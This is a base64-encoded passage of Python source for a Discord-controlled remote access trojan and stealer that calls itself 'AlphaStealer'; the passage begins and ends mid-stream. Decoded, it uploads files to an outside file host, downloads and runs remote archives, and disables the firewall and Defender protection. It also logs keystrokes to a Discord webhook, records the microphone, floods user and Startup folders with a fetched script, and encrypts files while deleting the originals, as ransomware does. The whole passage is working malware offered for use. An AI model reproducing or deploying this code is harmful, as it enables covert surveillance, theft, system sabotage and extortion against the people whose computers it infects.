gcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL2FwaS5nb2ZpbGUuaW8vdXBsb2FkRmlsZScsIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVzPXsnZmlsZSc6IGZpbGV9LCANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhPXsnYXBpS2V5JzogR09GSUxFX0FQSV9LRVl9KQ0KICAgICAgICAgICAgDQogICAgICAgICAgICByZXNwb25zZV9kYXRhID0gcmVzcG9uc2UuanNvbigpDQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmIHJlc3BvbnNlX2RhdGFbJ3N0YXR1cyddID09ICdvayc6DQogICAgICAgICAgICAgICAgZmlsZV91cmwgPSByZXNwb25zZV9kYXRhWydkYXRhJ11bJ2xpbmsnXQ0KICAgICAgICAgICAgICAgIHJldHVybiBmaWxlX3VybA0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICByZXR1cm4gTm9uZQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgcmV0dXJuIE5vbmUNCg0KQGJvdC5jb21tYW5kKG5hbWU9J3JlbW90ZScpDQphc3luYyBkZWYgcmVtb3RlKGN0eCk6DQogICAgb3MuY2hkaXIoZidDOlxcVXNlcnNcXHt1c2VybmFtZX1cXEFwcGRhdGEnKQ0KICAgIHVybCA9ICdodHRwczovL2dpdGh1Yi5jb20vVW5rNjkzL3JlbW90ZS9yYXcvYWFkMmFiZmUwM2ZkZWIyZjM2MmE4ZDQwYTA3YmM0Yjg0ZjE3ZDFlMS9yZW1vdGVwYy56aXAnDQogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsKQ0KICAgIEZpbGVQYWhSZW1vdGUgPSAncHl0aG9uIG1haW4ucHknDQoNCiAgICB3aXRoIG9wZW4oJ3JlbW90ZXBjLnppcCcsICd3YicpIGFzIGY6DQogICAgICAgIGYud3JpdGUocmVzcG9uc2UuY29udGVudCkNCg0KICAgIHdpdGggemlwZmlsZS5aaXBGaWxlKCdyZW1vdGVwYy56aXAnLCAncicpIGFzIHppcF9yZWY6DQogICAgICAgIHppcF9yZWYuZXh0cmFjdGFsbCgncmVtb3RlcGMnKQ0KICAgIGF3YWl0IGN0eC5zZW5kKCfinIUgRmlsZSBleHRyYWN0ZWQgc3VjY2Vzc2Z1bGx5LicpDQogICAgYXdhaXQgY3R4LnNlbmQoJ1J1bm5pbmcgdGhlIHNlcnZlci4uLicpDQogICAgYXdhaXQgY3R4LnNlbmQoJ+KchSBTZXJ2ZXIgaXMgcnVubmluZy4nKQ0KICAgIGF3YWl0IGN0eC5zZW5kKCdXYWl0aW5nIGZvciBuZ3JvayB0byBzdGFydC4uLicpDQogICAgYXdhaXQgY3R4LnNlbmQoJ1NlbmRpbmcgbmdyb2sgbG9ncy4uLicpDQoNCiAgICBvcy5jaGRpcigncmVtb3RlcGMnKQ0KICAgIG9zLmNoZGlyKCdyZW1vdGVwYycpDQoNCiAgICBzdWJwcm9jZXNzLlBvcGVuKEZpbGVQYWhSZW1vdGUsIHNoZWxsPVRydWUpDQoNCkBib3QuY29tbWFuZChuYW1lPSdjcHVraWxsZXInKQ0KYXN5bmMgZGVmIENwdUtpbGxlcihjdHgpOg0KICAgIGlmIFByb3RlY3RvcjoNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoJ+KdjCBFcnJvcjogUHJvdGVjdG9yIG1vZGUgZW5hYmxlZC4nKQ0KICAgICAgICByZXR1cm4NCiAgICANCiAgICBvcy5jaGRpcihmJ0M6XFxVc2Vyc1xce3VzZXJuYW1lfVxcQXBwZGF0YScpDQogICAgdXJsID0gJ2h0dHBzOi8vZ2l0aHViLmNvbS9Vbms2OTMvQ1BVL3Jhdy83ZTI3MzEzMDJlNDliNjdmY2E2NGYxY2I1MGU2YjIwNDJjMTFiNzg4L0NQVS56aXAnDQogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsKQ0KICAgIENwdUtpbGxlclN0YXJ0ZXIgPSAnc3RhcnQgL0IgQ3B1LUtpbGxlci5leGUnDQoNCiAgICB3aXRoIG9wZW4oJ0NQVS56aXAnLCAnd2InKSBhcyBmOg0KICAgICAgICBmLndyaXRlKHJlc3BvbnNlLmNvbnRlbnQpDQoNCiAgICB3aXRoIHppcGZpbGUuWmlwRmlsZSgnQ1BVLnppcCcsICdyJykgYXMgemlwX3JlZjoNCiAgICAgICAgemlwX3JlZi5leHRyYWN0YWxsKCdDUFUnKQ0KDQogICAgb3MuY2hkaXIoJ0NQVScpDQogICAgb3MuY2hkaXIoJ0NQVScpDQoNCiAgICBzdWJwcm9jZXNzLlBvcGVuKENwdUtpbGxlclN0YXJ0ZXIsIHNoZWxsPVRydWUpDQoNCiAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdDcHUga2lsbGVyIHN0YXJ0ZWQuJywgY29sb3I9MHhGRjAwMDApDQogICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCg0KQGJvdC5jb21tYW5kKG5hbWU9J3N0b3BjcHVraWxsZXInKQ0KYXN5bmMgZGVmIFN0b3BDcHVLaWxsZXIoY3R4KToNCiAgICBpZiBQcm90ZWN0b3I6DQogICAgICAgIGF3YWl0IGN0eC5zZW5kKCfinYwgRXJyb3I6IFByb3RlY3RvciBtb2RlIGVuYWJsZWQuJykNCiAgICAgICAgcmV0dXJuDQogICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj0nQ3B1IGtpbGxlciBzdG9wcGVkLicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQoNCiAgICBDcHVLaWxsZXJTdG9wcGVyID0gJ3Rhc2traWxsIC9GIC9JTSBDcHUtS2lsbGVyLmV4ZScNCiAgICBzdWJwcm9jZXNzLlBvcGVuKENwdUtpbGxlclN0b3BwZXIsIHNoZWxsPVRydWUpDQoNCkBib3QuY29tbWFuZChuYW1lPSdmaXJld2FsbG9uJykNCmFzeW5jIGRlZiBGaXJld2FsbE9uKGN0eCk6DQogICAgRmlyZXdhbGxPbkNvbW1hbmQgPSAnbmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGFsbHByb2ZpbGVzIHN0YXRlIG9uJw0KICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J0ZpcmV3YWxsIEVuYWJsZWQuJywgY29sb3I9MHhGRjAwMDAwKQ0KICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgc3VicHJvY2Vzcy5Qb3BlbihGaXJld2FsbE9uQ29tbWFuZCwgc2hlbGw9VHJ1ZSkNCg0KQGJvdC5jb21tYW5kKG5hbWU9J2ZpcmV3YWxsb2ZmJykNCmFzeW5jIGRlZiBGaXJld2FsbE9mZihjdHgpOg0KICAgIEZpcmV3YWxsT2ZmQ29tbWFuZCA9ICduZXRzaCBhZHZmaXJld2FsbCBzZXQgYWxscHJvZmlsZXMgc3RhdGUgb2ZmJw0KICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J0ZpcmV3YWxsIERpc2FibGVkLicsIGNvbG9yPTB4RkYwMDAwMCkNCiAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KICAgIHN1YnByb2Nlc3MuUG9wZW4oRmlyZXdhbGxPZmZDb21tYW5kLCBzaGVsbD1UcnVlKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0nYW50aXZpcnVzb24nKQ0KYXN5bmMgZGVmIEFudGl2aXJ1c09uKGN0eCk6DQogICAgQW50aXZpcnVzT25Db21tYW5kID0gJ3JlZyBhZGQgIkhLRVlfTE9DQUxfTUFDSElORVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlciIgL3YgRGlzYWJsZUFudGlTcHl3YXJlIC90IFJFR19EV09SRCAvZCAwIC9mJw0KICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J0FudGl2aXJ1cyBFbmFibGVkLicsIGNvbG9yPTB4RkYwMDAwMCkNCiAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KICAgIHN1YnByb2Nlc3MuUG9wZW4oQW50aXZpcnVzT25Db21tYW5kLCBzaGVsbD1UcnVlKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0nYW50aXZpcnVzb2ZmJykNCmFzeW5jIGRlZiBBbnRpdmlydXNPZmYoY3R4KToNCiAgICBBbnRpdmlydXNPZmZDb21tYW5kID0gJ3JlZyBhZGQgIkhLRVlfTE9DQUxfTUFDSElORVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlciIgL3YgRGlzYWJsZUFudGlTcHl3YXJlIC90IFJFR19EV09SRCAvZCAxIC9mJw0KICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J0FudGl2aXJ1cyBEaXNhYmxlZC4nLCBjb2xvcj0weEZGMDAwMDApDQogICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCiAgICBzdWJwcm9jZXNzLlBvcGVuKEFudGl2aXJ1c09mZkNvbW1hbmQsIHNoZWxsPVRydWUpDQoNCmtleWxvZ3MgPSBbXQ0Ka2V5bG9nZ2VyX3J1bm5pbmcgPSBGYWxzZQ0KV2ViaG9va0tleWxvZ2dlciA9IE5vbmUNCg0KZGVmIGNhcHR1cmVfa2V5c3Ryb2tlcyhldmVudCk6DQogICAgZ2xvYmFsIGtleWxvZ3MNCiAgICBrZXlsb2dzLmFwcGVuZChldmVudC5uYW1lKQ0KDQpkZWYgc2VuZF9rZXlsb2dzKCk6DQogICAgZ2xvYmFsIGtleWxvZ3MsIGtleWxvZ2dlcl9ydW5uaW5nLCBXZWJob29rS2V5bG9nZ2VyDQoNCiAgICB3aGlsZSBrZXlsb2dnZXJfcnVubmluZzoNCiAgICAgICAgaWYga2V5bG9ncyBhbmQgV2ViaG9va0tleWxvZ2dlcjoNCiAgICAgICAgICAgIHBheWxvYWQgPSB7DQogICAgICAgICAgICAgICAgJ2NvbnRlbnQnOiAnXG4nLmpvaW4oa2V5bG9ncyksDQogICAgICAgICAgICAgICAgJ3VzZXJuYW1lJzogJ0FscGhhU3RlYWxlciBLZXlsb2dnZXInLA0KICAgICAgICAgICAgICAgICdhdmF0YXJfdXJsJzogJ2h0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvMTM2NTk5MDAzMTkxMDUwNjQ5Ni9hXzYyMGIyYzIwMjczZGU0ZTI4MjQ3ZTlhOWQ2N2QyMmY4LmdpZj9zaXplPTQwOTYnDQogICAgICAgICAgICB9DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgcmVxdWVzdHMucG9zdChXZWJob29rS2V5bG9nZ2VyLCBqc29uPXBheWxvYWQpDQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICAgICAgcGFzcw0KDQogICAgICAgICAgICBrZXlsb2dzID0gW10NCiAgICAgICAgDQogICAgICAgIHRpbWUuc2xlZXAoMSkNCg0KZGVmIHN0YXJ0X2tleWxvZ2dlcigpOg0KICAgIGdsb2JhbCBrZXlsb2dnZXJfcnVubmluZw0KDQogICAgaWYgbm90IGtleWxvZ2dlcl9ydW5uaW5nOg0KICAgICAgICBrZXlsb2dnZXJfcnVubmluZyA9IFRydWUNCiAgICAgICAga2V5Ym9hcmQub25fcmVsZWFzZShjYWxsYmFjaz1jYXB0dXJlX2tleXN0cm9rZXMpDQoNCiAgICAgICAgdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VuZF9rZXlsb2dzLCBkYWVtb249VHJ1ZSkNCiAgICAgICAgdGhyZWFkLmRhZW1vbiA9IFRydWUNCiAgICAgICAgdGhyZWFkLnN0YXJ0KCkNCg0KZGVmIHN0b3Bfa2V5bG9nZ2VyKCk6DQogICAgZ2xvYmFsIGtleWxvZ2dlcl9ydW5uaW5nDQoNCiAgICBpZiBrZXlsb2dnZXJfcnVubmluZzoNCiAgICAgICAga2V5bG9nZ2VyX3J1bm5pbmcgPSBGYWxzZQ0KICAgICAgICBrZXlib2FyZC51bmhvb2tfYWxsKCkNCg0KQGJvdC5jb21tYW5kKG5hbWU9ImtleWxvZ2dlciIpDQphc3luYyBkZWYgc3RhcnRfa2V5Ym9hcmQoY3R4KToNCiAgICBnbG9iYWwga2V5bG9nZ2VyX3J1bm5pbmcsIFdlYmhvb2tLZXlsb2dnZXINCg0KICAgIGNhdGVnb3J5ID0gY3R4LmNoYW5uZWwuY2F0ZWdvcnkNCiAgICBpZiBjYXRlZ29yeSBpcyBOb25lOg0KICAgICAgICByZXR1cm4NCg0KICAgIGd1aWxkID0gY3R4Lmd1aWxkDQoNCiAgICBrZXlsb2dzX2NoYW5uZWwgPSBkaXNjb3JkLnV0aWxzLmdldChjYXRlZ29yeS5jaGFubmVscywgbmFtZT0ia2V5bG9ncyIpDQoNCiAgICBpZiBub3Qga2V5bG9nc19jaGFubmVsOg0KICAgICAgICBrZXlsb2dzX2NoYW5uZWwgPSBhd2FpdCBndWlsZC5jcmVhdGVfdGV4dF9jaGFubmVsKCJrZXlsb2dzIiwgY2F0ZWdvcnk9Y2F0ZWdvcnkpDQoNCiAgICAgICAgY2hhbm5lbHNfaW5fY2F0ZWdvcnkgPSBjYXRlZ29yeS5jaGFubmVscw0KICAgICAgICBjaGFubmVsc19saXN0ID0gbGlzdChjaGFubmVsc19pbl9jYXRlZ29yeSkNCiAgICAgICAgaWYga2V5bG9nc19jaGFubmVsIGluIGNoYW5uZWxzX2xpc3Q6DQogICAgICAgICAgICBjaGFubmVsc19saXN0LnJlbW92ZShrZXlsb2dzX2NoYW5uZWwpDQoNCiAgICAgICAgcG9zaXRpb25fdG9faW5zZXJ0ID0gNQ0KICAgICAgICBpZiBwb3NpdGlvbl90b19pbnNlcnQgPiBsZW4oY2hhbm5lbHNfbGlzdCk6DQogICAgICAgICAgICBwb3NpdGlvbl90b19pbnNlcnQgPSBsZW4oY2hhbm5lbHNfbGlzdCkNCiAgICAgICAgY2hhbm5lbHNfbGlzdC5pbnNlcnQocG9zaXRpb25fdG9faW5zZXJ0LCBrZXlsb2dzX2NoYW5uZWwpDQoNCiAgICAgICAgZm9yIGluZGV4LCBjaGFubmVsIGluIGVudW1lcmF0ZShjaGFubmVsc19saXN0KToNCiAgICAgICAgICAgIGF3YWl0IGNoYW5uZWwuZWRpdChwb3NpdGlvbj1pbmRleCkNCg0KICAgIGlmIGtleWxvZ2dlcl9ydW5uaW5nOg0KICAgICAgICBhd2FpdCBjdHguc2VuZCgi4pqg77iPIEVsIGtleWxvZ2dlciB5YSBlc3TDoSBhY3Rpdm8uIikNCiAgICAgICAgcmV0dXJuDQoNCiAgICB3ZWJob29rID0gYXdhaXQga2V5bG9nc19jaGFubmVsLmNyZWF0ZV93ZWJob29rKG5hbWU9IkFscGhhU3RlYWxlciIpDQogICAgV2ViaG9va0tleWxvZ2dlciA9IHdlYmhvb2sudXJsDQoNCiAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdLZXlsb2dnZXIgU3RhcnRlZC4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQogICAgc3RhcnRfa2V5bG9nZ2VyKCkNCg0KQGJvdC5jb21tYW5kKG5hbWU9InN0b3BrZXlsb2dnZXIiKQ0KYXN5bmMgZGVmIHN0b3Bfa2V5Ym9hcmQoY3R4KToNCiAgICBnbG9iYWwga2V5bG9nZ2VyX3J1bm5pbmcNCg0KICAgIGlmIGtleWxvZ2dlcl9ydW5uaW5nOg0KICAgICAgICBzdG9wX2tleWxvZ2dlcigpDQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J0tleWxvZ2dlciBTdG9wcGVkLicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCiAgICBlbHNlOg0KICAgICAgICBwYXNzDQoNCkBib3QuY29tbWFuZChuYW1lPSdncmFibWljJykNCkBDaGVja0NhdGVnb3J5DQphc3luYyBkZWYgZ3JhYm1pYyhjdHgpOg0KICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J1JlY29yZGluZyB0aGUgbWljcm9waG9uZS4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQogICAgZnMgPSA0NDEwMA0KICAgIHNlY29uZHMgPSAxNQ0KICAgIHJlY29yZGluZyA9IHNkLnJlYyhpbnQoc2Vjb25kcyAqIGZzKSwgc2FtcGxlcmF0ZT1mcywgY2hhbm5lbHM9MSkNCiAgICBzZC53YWl0KCkNCg0KICAgIGZpbGVuYW1lID0gIkFscGhhQXVkaW8ud2F2Ig0KICAgIHdyaXRlKGZpbGVuYW1lLCBmcywgcmVjb3JkaW5nKQ0KDQogICAgYXdhaXQgY3R4LnNlbmQoZmlsZT1kaXNjb3JkLkZpbGUoZmlsZW5hbWUpKQ0KDQpzdG9wX2V2ZW50ID0gdGhyZWFkaW5nLkV2ZW50KCkNCg0KZGVmIGdlbmVyYXJfbm9tYnJlX2FsZWF0b3Jpbyhsb25naXR1ZD04KToNCiAgICBjYXJhY3RlcmVzID0gc3RyaW5nLmFzY2lpX2xldHRlcnMgKyBzdHJpbmcuZGlnaXRzDQogICAgbm9tYnJlID0gJycuam9pbihyYW5kb20uY2hvaWNlKGNhcmFjdGVyZXMpIGZvciBfIGluIHJhbmdlKGxvbmdpdHVkKSkNCiAgICByZXR1cm4gbm9tYnJlDQoNCmRlZiBTdG9yYWdlQm9tYmVyKCk6DQogICAgaW1hZ2VzcGF0aCA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWydVU0VSUFJPRklMRSddLCAnUGljdHVyZXMnKQ0KICAgIGRvY3VtZW50c19wYXRoID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bJ1VTRVJQUk9GSUxFJ10sICdEb2N1bWVudHMnKQ0KICAgIGFwcGRhdGFfcGF0aCA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWydVU0VSUFJPRklMRSddLCAnQXBwRGF0YScpDQogICAgbG9jYWxfcGF0aCA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWydVU0VSUFJPRklMRSddLCAnQXBwRGF0YScsICdMb2NhbCcpDQogICAgcm9hbWluZ19wYXRoID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bJ1VTRVJQUk9GSUxFJ10sICdBcHBEYXRhJywgJ1JvYW1pbmcnKQ0KICAgIHN0YXJ0dXBfcGF0aCA9IG9zLnBhdGguam9pbihyb2FtaW5nX3BhdGgsICdNaWNyb3NvZnQnLCAnV2luZG93cycsICdTdGFydCBNZW51JywgJ1Byb2dyYW1zJywgJ1N0YXJ0dXAnKQ0KICAgIGRlc2t0b3BfcGF0aCA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWydVU0VSUFJPRklMRSddLCAnRGVza3RvcCcpDQoNCiAgICBydXRhcyA9IFtpbWFnZXNwYXRoLCBkb2N1bWVudHNfcGF0aCwgYXBwZGF0YV9wYXRoLCBsb2NhbF9wYXRoLCByb2FtaW5nX3BhdGgsIHN0YXJ0dXBfcGF0aCwgZGVza3RvcF9wYXRoXQ0KDQogICAgdXJsID0gJ2h0dHBzOi8vZXNxdWVsZXN0ZWFsZXIubWUvYXNzZXRzL2VVSmNhY1hvMDMveUdiVW9UQkozWi9pbmRleC04MWU5MDE3Ni5qcycNCiAgICB0cnk6DQogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHVybCkudGV4dA0KICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLlJlcXVlc3RFeGNlcHRpb24gYXMgZToNCiAgICAgICAgcmV0dXJuDQogICAgDQogICAgZm9yIGkgaW4gcmFuZ2UoMTApOg0KICAgICAgICBpZiBzdG9wX2V2ZW50LmlzX3NldCgpOg0KICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgDQogICAgICAgIG5vbWJyZSA9IGdlbmVyYXJfbm9tYnJlX2FsZWF0b3JpbygpDQoNCiAgICAgICAgZm9yIHJ1dGEgaW4gcnV0YXM6DQogICAgICAgICAgICBhcmNoaXZvX3BhdGggPSBvcy5wYXRoLmpvaW4ocnV0YSwgZiJ7bm9tYnJlfS5hc3EiKQ0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIHdpdGggb3BlbihhcmNoaXZvX3BhdGgsICd3JywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjoNCiAgICAgICAgICAgICAgICAgICAgZi53cml0ZShyZXNwb25zZSkNCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgICAgICBwYXNzDQogICAgICAgIA0KQGJvdC5jb21tYW5kKG5hbWU9J3N0b3JhZ2Vib21iZXInKQ0KYXN5bmMgZGVmIFN0YXJ0U3RvcmFnZUJvbWJlcihjdHgpOg0KICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J1N0b3JhZ2UgYm9tYmVyIHN0YXJ0ZWQuJywgY29sb3I9MHhGRjAwMDApDQogICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCg0KICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVN0b3JhZ2VCb21iZXIsIGRhZW1vbj1UcnVlKS5zdGFydCgpDQoNCkBib3QuY29tbWFuZChuYW1lPSdzdG9wc3RvcmFnZWJvbWJlcicpDQphc3luYyBkZWYgU3RvcFN0b3JhZ2VCb21iZXIoY3R4KToNCiAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdTdG9yYWdlIGJvbWJlciBzdG9wcGVkLicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQoNCiAgICBzdG9wX2V2ZW50LnNldCgpDQoNCmRlZiBnZW5lcmFyX2tleSgpOg0KICAgIGtleSA9IEZlcm5ldC5nZW5lcmF0ZV9rZXkoKQ0KICAgIHdpdGggb3Blbigna2V5LmtleScsICd3YicpIGFzIGtmOg0KICAgICAgICBrZi53cml0ZShrZXkpDQoNCmRlZiBjYXJnYXJfa2V5KCk6DQogICAgcmV0dXJuIG9wZW4oJ2tleS5rZXknLCAncmInKS5yZWFkKCkNCg0KZGVmIGVuY3J5cHQoaXRlbXMsIGtleSk6DQogICAgZiA9IEZlcm5ldChrZXkpDQogICAgZm9yIGl0ZW0gaW4gaXRlbXM6DQogICAgICAgIHdpdGggb3BlbihpdGVtLCAncmInKSBhcyBmaWxlOg0KICAgICAgICAgICAgZmlsZV9kYXRhID0gZmlsZS5yZWFkKCkNCiAgICAgICAgZW5jcnlwdGVkX2RhdGEgPSBmLmVuY3J5cHQoZmlsZV9kYXRhKQ0KICAgICAgICANCiAgICAgICAgZW5jcnlwdGVkX2l0ZW0gPSBpdGVtICsgJy5hc3EuZW5jcnlwdGVkJw0KICAgICAgICB3aXRoIG9wZW4oZW5jcnlwdGVkX2l0ZW0sICd3YicpIGFzIGZpbGU6DQogICAgICAgICAgICBmaWxlLndyaXRlKGVuY3J5cHRlZF9kYXRhKQ0KICAgICAgICANCiAgICAgICAgb3MucmVtb3ZlKGl0ZW0pDQoNCmRlZiBkZWNyeXB0KGl0ZW1zLCBrZXkpOg0KICAgIGYgPSBGZXJuZXQoa2V5KQ0KICAgIGZvciBpdGVtIGluIGl0ZW1zOg0KICAgICAgICB3aXRoIG9wZW4oaXRlbSwgJ3JiJykgYXMgZmlsZToNCiAgICAgICAgICAgIGVuY3J5cHRlZF9kYXRhID0gZmlsZS5yZWFkKCkNCiAgICAgICAgZGVjcnlwdGVkX2RhdGEgPSBmLmRlY3J5cHQoZW5jcnlwdGVkX2RhdGEpDQogICAgICAgIA0KICAgICAgICBkZWNyeXB0ZWRfaXRlbSA9IGl0ZW0ucmVwbGFjZSgnLmFzcS5lbmNyeXB0ZWQnLCAnJykNCiAgICAgICAgd2l0aCBvcGVuKGRlY3J5cHRlZF9pdGVtLCAnd2InKSBhcyBmaWxlOg0KICAgICAgICAgICAgZmlsZS53cml0ZShkZWNyeXB0ZWRfZGF0YSkNCiAgICAgICAgDQogICAgICAgIG9zLnJlbW92ZShpdGVtKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0nZW5jcnlwdCcpDQphc3luYyBkZWYgY2VuY3J5cHQoY3R4LCBmaWxlcGF0aDogc3RyKToNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoZmlsZXBhdGgpOg0KICAgICAgICByZXR1cm4NCg0KICAgIGlmIG9zLnBhdGguaXNkaXIoZmlsZXBhdGgpOg0KICAgICAgICBpdGVtcyA9IG9zLmxpc3RkaXIoZmlsZXBhdGgpDQogICAgICAgIGZ1bGxfcGF0aHMgPSBbb3MucGF0aC5qb2luKGZpbGVwYXRoLCBpdGVtKSBmb3IgaXRlbSBpbiBpdGVtc10NCiAgICBlbGlmIG9zLnBhdGguaXNmaWxlKGZpbGVwYXRoKToNCiAgICAgICAgZnVsbF9wYXRocyA9IFtmaWxlcGF0aF0NCiAgICBlbHNlOg0KICAgICAgICByZXR1cm4NCg0KICAgIGdlbmVyYXJfa2V5KCkNCiAgICBrZXkgPSBjYXJnYXJfa2V5KCkNCg0KICAgIGVuY3J5cHQoZnVsbF9wYXRocywga2V5KQ0KDQogICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj0nQWxsIGZpbGVzIGVuY3J5cHRlZC4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0nZGVjcnlwdCcpDQphc3luYyBkZWYgY2RlY3J5cHQoY3R4LCBmaWxlcGF0aDogc3RyKToNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoZmlsZXBhdGgpOg0KICAgICAgICByZXR1cm4NCg0KICAgIGlmIG9zLnBhdGguaXNkaXIoZmlsZXBhdGgpOg0KICAgICAgICBpdGVtcyA9IG9zLmxpc3RkaXIoZmlsZXBhdGgpDQogICAgICAgIGZ1bGxfcGF0aHMgPSBbb3MucGF0aC5qb2luKGZpbGVwYXRoLCBpdGVtKSBmb3IgaXRlbSBpbiBpdGVtc10NCiAgICBlbGlmIG9zLnBhdGguaXNmaWxlKGZpbGVwYXRoKToNCiAgICAgICAgZnVsbF9wYXRocyA9IFtma